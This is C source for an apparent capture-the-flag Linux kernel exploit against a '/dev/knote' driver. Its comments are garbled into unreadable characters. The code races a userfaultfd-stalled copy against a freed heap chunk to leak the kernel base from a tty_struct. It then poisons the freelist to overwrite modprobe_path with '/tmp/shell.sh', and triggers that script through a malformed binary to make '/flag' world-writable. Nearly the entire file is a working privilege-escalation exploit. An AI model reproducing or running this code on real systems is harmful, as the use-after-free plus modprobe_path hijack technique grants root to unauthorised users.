#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <poll.h>
#include <sys/syscall.h>
#include <sys/mman.h>
//ҳ��С
#define PAGE_SIZE 0x1000
//tty_struct�Ĵ�С
#define TTY_STRUCT_SIZE 0X2E0
//cat /proc/kallsyms | grep modprobe_path
#define MOD_PROBE 0x145c5c0
//�ڶ�������ʱ����ͳһ�Ĵ�С
//�������,�����С������
#define CHUNK_SIZE 0x100
//modprobe_path�ĵ�ַ
size_t modprobe_path;

//�������ļ�������
int fd;
//ptmx���ļ�������
int tty_fd;

//�������������ݽṹ
struct Data {
    union {
        size_t size; //��С
        size_t index; //�±�
    };
    void *buf; //����
};
void errExit(char *msg) {
    puts(msg);
    exit(-1);
}

void initFD() {
    fd = open("/dev/knote",O_RDWR);
    if (fd < 0) {
        errExit("device open error!!");
    }
}
//����һ���ڵ�
void kcreate(size_t size) {
    struct Data data;
    data.size = size;
    data.buf = NULL;
    ioctl(fd,0x1337,&data);
}
//ɾ��һ���ڵ�
void kdelete(size_t index) {
    struct Data data;
    data.index = index;
    ioctl(fd,0x6666,&data);
}
//�༭һ���ڵ�
void kedit(size_t index,void *buf) {
    struct Data data;
    data.index = index;
    data.buf = buf;
    ioctl(fd,0x8888,&data);
}
//��ʾ�ڵ������
void kshow(size_t index,void *buf) {
    struct Data data;
    data.index = index;
    data.buf = buf;
    ioctl(fd,0x2333,&data);
}


//ע��һ��userfaultfd������ȱҳ����
void registerUserfault(void *fault_page,void *handler)
{
    pthread_t thr;
    struct uffdio_api ua;
    struct uffdio_register ur;
    uint64_t uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    ua.api = UFFD_API;
    ua.features    = 0;
    if (ioctl(uffd, UFFDIO_API, &ua) == -1)
        errExit("[-] ioctl-UFFDIO_API");

    ur.range.start = (unsigned long)fault_page; //����Ҫ���ӵ�����
    ur.range.len   = PAGE_SIZE;
    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1) //ע��ȱҳ������������ȱҳʱ���������������ʱ����������һ���߳������
        errExit("[-] ioctl-UFFDIO_REGISTER");
    //��һ���̣߳����մ�����źţ�Ȼ����
    int s = pthread_create(&thr, NULL,handler, (void*)uffd);
    if (s!=0)
        errExit("[-] pthread_create");
}

//���laekKernelBaseʱ��ȱҳ�����߳�
//����߳�����ǲ���Ҫ��ʲô��������
//Ϊ����������ʱ�䣬���ӽ����㹻��ʱ��
//���γ�һ��UAF
void* leak_handler(void *arg)
{
    struct uffd_msg msg;
    unsigned long uffd = (unsigned long)arg;
    puts("[+] leak_handler created");
    sleep(3); //����һ�£������ӽ����㹻ʱ�����
    struct pollfd pollfd;
    int nready;
    pollfd.fd     = uffd;
    pollfd.events = POLLIN;
    //poll��������ֱ���յ�ȱҳ�������Ϣ
    nready = poll(&pollfd, 1, -1);
    if (nready != 1)
        errExit("[-] Wrong pool return value");
    nready = read(uffd, &msg, sizeof(msg));
    if (nready <= 0) {
        errExit("[-]msg error!!");
    }

    char *page = (char*)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED)
        errExit("[-]mmap page error!!");
    struct uffdio_copy uc;
    //��ʼ��pageҳ
    memset(page, 0, sizeof(page));
    uc.src = (unsigned long)page;
    //����ȱҳ��λ��
    uc.dst = (unsigned long)msg.arg.pagefault.address & ~(PAGE_SIZE - 1);;
    uc.len = PAGE_SIZE;
    uc.mode = 0;
    uc.copy = 0;
    //�������ݵ�ȱҳ�������ָ�copy_user_generic_unrolled��ִ��
    //Ȼ�������������������ʱ�䣬��0�������Ѿ���tty_struct�ṹ
    //��ˣ�copy_user_generic_unrolled�����tty_struct�Ľṹ���Ƹ������û�̬
    ioctl(uffd, UFFDIO_COPY, &uc);

    puts("[+] leak_handler done!!");
    return NULL;
}

//й¶�ں˵�ַ
void leakKernelBase() {
    //����һ����tty_struct�ṹ��С��ͬ�Ķ�
    kcreate(TTY_STRUCT_SIZE);
    //���ڽ���kshow�����ݣ�������������mmapӳ���һ�����򣬴���kshowʱ������ȱҳ���󣬴Ӷ����Խ��������Զ����
    //������������
    char *user_buf = (char*)mmap(NULL,PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (user_buf == MAP_FAILED)
        errExit("[-] mmap user_buf error!!");
    //ע��һ��userfaultfd������user_buf����ȱҳ
    registerUserfault(user_buf,leak_handler);

    int pid = fork();
    if (pid < 0) {
        errExit("[-]fork error!!");
    } else if (pid == 0) { //�ӽ���
        sleep(1); //�ø�������ִ�У�����userfaultfd�������������߳̿���Ϊ����Ϊ�Ĳ���
        kdelete(0); //ɾ�����Ǵ������Ǹ���
        tty_fd = open("/dev/ptmx",O_RDWR); //��һ������������tty_struct�Ľṹ���뵽�����ͷź�Ķ������UAF����й¶��Ϣ
        exit(0); //�˳��ӽ���
    } else {
        //�����̴���ȱҳ���󣬴Ӷ�����handle���������������ӽ����㹻�Ĳ���ʱ��
        kshow(0,user_buf);
        //���ڣ�user_buf��洢��tty_struct�ṹ�����Ƕ����������Եõ��ܶ�����
        size_t *data = (size_t *)user_buf;
        if (data[7] == 0) { //û�����ݣ�˵��ʧ����
            munmap(user_buf, PAGE_SIZE);
            close(tty_fd);
            errExit("[-]leak data error!!");
        }
        close(tty_fd); //�ر�ptmx�豸,�ͷ�ռ�õĿռ�
        //�õ�ĳ�����ĵ�ַ
        size_t x_fun_addr = data[0x56];
        //������ں˻�ַ
        size_t kernel_base = x_fun_addr - 0x5d4ef0;
        //���ں�����δ֪�Ķ������ļ�ʱ�������modprobe_pathָ��Ŀ�ִ���ļ�
        //��ˣ����ǵ�Ŀ���ǽٳ�modprobe_path��ָ��һ��shell�ļ�����
        modprobe_path = kernel_base + MOD_PROBE;
        printf("kernel_base=0x%lx\n",kernel_base);
        printf("modprobe_path=0x%lx\n",modprobe_path);
    }
}

//���writeHeapFDʱ��ȱҳ�����߳�
//����߳������Ҫ��modprobe_path�ĵ�ַ
//д��ȥ
void* write_handler(void *arg)
{
    struct uffd_msg msg;
    unsigned long uffd = (unsigned long)arg;
    puts("[+] write_handler created");
    sleep(3); //����һ�£������ӽ����㹻ʱ��������γ�UAF
    struct pollfd pollfd;
    int nready;
    pollfd.fd     = uffd;
    pollfd.events = POLLIN;
    //poll��������ֱ���յ�ȱҳ�������Ϣ
    nready = poll(&pollfd, 1, -1);
    if (nready != 1)
        errExit("[-] Wrong pool return value");
    nready = read(uffd, &msg, sizeof(msg));
    if (nready <= 0) {
        errExit("[-]msg error!!");
    }
    //�����Ƿ���ȱҳ�Ĵ���
    //assert(msg.event == UFFD_EVENT_PAGEFAULT);
    char *page = (char*)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (page == MAP_FAILED)
        errExit("[-]mmap page error!!");
    struct uffdio_copy uc;
    //��ʼ��pageҳ
    memset(page, 0, sizeof(page));
    //д��modprobe_path
    memcpy(page,&modprobe_path,8);
    uc.src = (unsigned long)page;
    //����ȱҳ��λ��
    uc.dst = (unsigned long)msg.arg.pagefault.address & ~(PAGE_SIZE - 1);;
    uc.len = PAGE_SIZE;
    uc.mode = 0;
    uc.copy = 0;
    //�������ݵ�ȱҳ�������ָ�copy_user_generic_unrolled��ִ��
    //Ȼ�������������������ʱ�䣬��0���ͷŵ��ˣ����ָ���ʱ��
    //����һ���Ѿ��ͷŵĶ�д����
    ioctl(uffd, UFFDIO_COPY, &uc);
    puts("[+] writek_handler done!!");
    return NULL;
}


//����������д���жѿ��nextָ��,ʹ����leakKernelBaseͬ���ķ���
void writeHeapFD() {
    kcreate(CHUNK_SIZE); //0
    //���ڽ���kedit�����ݣ�������������mmapӳ���һ�����򣬴���keditʱ������ȱҳ���󣬴Ӷ����Խ��������Զ����
    //������������
    char *user_buf = (char*)mmap(NULL,PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (user_buf == MAP_FAILED)
        errExit("[-] mmap user_buf error!!");
    //ע��һ��userfaultfd������user_buf����ȱҳ
    registerUserfault(user_buf,write_handler);
    int pid = fork();
    if (pid < 0) {
        errExit("[-]fork error!!");
    } else if (pid == 0) { //�ӽ���
        sleep(1); //�ø�������ִ�У�����userfaultfd����
        kdelete(0); //ɾ���ѣ��γ�UAF
        exit(0);
    } else {
        kedit(0,user_buf); //����ȱҳ��������
        //kedit�����󣬿��п��next���Ѿ�д���˹���Ŀ��ĵ�ַ
    }

}

char tmp[0x100] = {0};
int main() {
    //��ʼ������
    initFD();
    //��������й¶�ں˻�ַ
    leakKernelBase();
    sleep(2);
    //��modprobe_path��ַд�����жѵ�nextָ�봦
    writeHeapFD();
    sleep(2);
    kcreate(CHUNK_SIZE); //0
    kcreate(CHUNK_SIZE); //1�����䵽Ŀ�괦
    strcpy(tmp,"/tmp/shell.sh");
    kedit(1,tmp); //��modprobe_pathָ�����ǵ�shell�ļ�
    //����һ������getshelll�Ľű�
    system("echo '#!/bin/sh' >> /tmp/shell.sh");
    system("echo 'chmod 777 /flag' >> /tmp/shell.sh");
    system("chmod +x /tmp/shell.sh");
    //����һ���Ƿ��Ķ������ļ���ִ�У�����shell
    system("echo -e '\\xff\\xff\\xff\\xff' > /tmp/fake");
    system("chmod +x /tmp/fake");
    //����shellִ�У��޸�flag�ļ���ͨ�û����Զ�д
    system("/tmp/fake");
    system("cat /flag");
    //��������ʱ�����ͷŶѣ��������ǵ�modprobe_path�����ǺϷ��Ķѣ����ͷų��������ں˱�������
    sleep(3);
    return 0;
}
